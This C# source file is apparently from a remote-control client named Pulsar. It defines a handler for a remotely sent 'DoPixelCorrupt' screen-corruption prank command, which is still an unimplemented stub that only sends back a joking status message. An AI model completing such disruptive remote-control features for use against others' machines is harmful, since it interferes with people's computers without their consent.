using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Common.Messages.FunStuff.GDI;
using Pulsar.Common.Messages.other;

namespace Pulsar.Client.Messages
{

    public class GDIHandler : IMessageProcessor
    {

        public bool CanExecute(IMessage message) => message is DoPixelCorrupt;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoPixelCorrupt msg:
                    Execute(sender, msg);
                    break;
            }
        }


        // TODO: Implement this
        private void Execute(ISender client, DoPixelCorrupt message)
        {
            client.Send(new SetStatus 
            { 
                Message = "Corrupting er pixels!! (jk not yet)" 
            });
        }
    }
}
